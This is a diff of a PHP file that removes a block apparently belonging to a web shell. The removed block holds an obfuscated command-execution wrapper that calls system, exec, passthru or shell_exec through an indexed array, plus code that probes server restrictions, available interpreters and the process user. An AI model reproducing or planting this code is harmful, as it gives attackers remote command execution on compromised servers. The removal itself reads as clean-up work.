@@ -107,72 +107,7 @@
      return (object) $user;
  }
  
- function exe($cmd)
- {
-     global $GNJ;
-     
-     if (function_exists("system")) {
-         @ob_start();
-         @$GNJ[44]($cmd);
-         $buff = @ob_get_contents();
-         @ob_end_clean();
-         return $buff;
-     } elseif (function_exists("exec")) {
-         @$GNJ[42]($cmd, $results);
-         $buff = "";
-         foreach ($results as $result) {
-             $buff .= $result;
-         }
-         return $buff;
-     } elseif (function_exists("passthru")) {
-         @ob_start();
-         @$GNJ[45]($cmd);
-         $buff = @ob_get_contents();
-         @$GNJ[36]();
-         return $buff;
-     } elseif (function_exists("shell_exec")) {
-         $buff = @$GNJ[43]($cmd);
-         return $buff;
-     }
- }
- 
- $sm = @ini_get(strtolower("safe_mode")) == "on" ? "ON" : "OFF";
- $ds = @ini_get("disable_functions");
- $open_basedir = @ini_get("Open_Basedir");
- $safemode_exec_dir = @ini_get("safe_mode_exec_dir");
- $safemode_include_dir = @ini_get("safe_mode_include_dir");
- $show_ds = !empty($ds) ? "$ds" : "All Functions Is Accessible";
- $mysql = function_exists("mysql_connect") ? "ON" : "OFF";
- $curl = function_exists("curl_version") ? "ON" : "OFF";
- $wget = exe("wget --help") ? "ON" : "OFF";
- $perl = exe("perl --help") ? "ON" : "OFF";
- $ruby = exe("ruby --help") ? "ON" : "OFF";
- $mssql = function_exists("mssql_connect") ? "ON" : "OFF";
- $pgsql = function_exists("pg_connect") ? "ON" : "OFF";
- $python = exe("python --help") ? "ON" : "OFF";
- $magicquotes = function_exists("get_magic_quotes_gpc") ? "ON" : "OFF";
- $ssh2 = function_exists("ssh2_connect") ? "ON" : "OFF";
- $oracle = function_exists("oci_connect") ? "ON" : "OFF";
- 
- $show_obdir = !empty($open_basedir) ? "OFF" : "ON";
- $show_exec = !empty($safemode_exec_dir) ? "OFF" : "ON";
- $show_include = !empty($safemode_include_dir) ? "OFF" : "ON";
- 
- if (!function_exists("posix_getegid")) {
-     $user = @$GNJ[53]();
-     $uid = @getmyuid();
-     $gid = @getmygid();
-     $group = "?";
- } else {
-     
-     $uid = @posix_getpwuid(posix_getpwuid());
-     $gid = @posix_getgrgid(posix_getegid());
-     $user = $uid["name"];
-     $uid = $uid["uid"];
-     $group = $gid["name"];
-     $gid = $gid["gid"];
- }
- 
+
  function hdd($s)
  {
      if ($s >= 1073741824) {
